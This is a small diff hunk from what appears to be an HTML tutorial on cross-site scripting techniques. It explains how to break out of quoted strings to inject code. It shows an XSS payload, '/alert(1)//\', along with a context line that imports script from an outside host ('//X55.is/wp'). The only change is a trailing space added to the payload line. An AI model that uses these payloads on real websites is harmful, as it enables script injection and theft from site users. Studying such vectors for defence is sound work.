@@ -21,7 +21,7 @@ import('//X55.is/wp')<br />
 <b>Concept:</b> To escape from any string value where user input is embedded, an injection of single or double quotes is essential unless there are two injection points.<br >
 
 <b>Example:</b>
-/alert(1)//\<br >
+/alert(1)//\ <br >
 <b>Explanation:</b> When user inputs are inserted into strings without proper sanitization, attackers can use single or double quotes to close the string and execute arbitrary code. However, if you have two injection points (such as opening and closing quotes around your payload), breaking out of a single point might not be necessary. The goal here is to manipulate the syntax of the code by closing strings prematurely, enabling the injection of additional malicious code.<br >
 
 <h3>4. Anchors as XSS Vectors</h3>
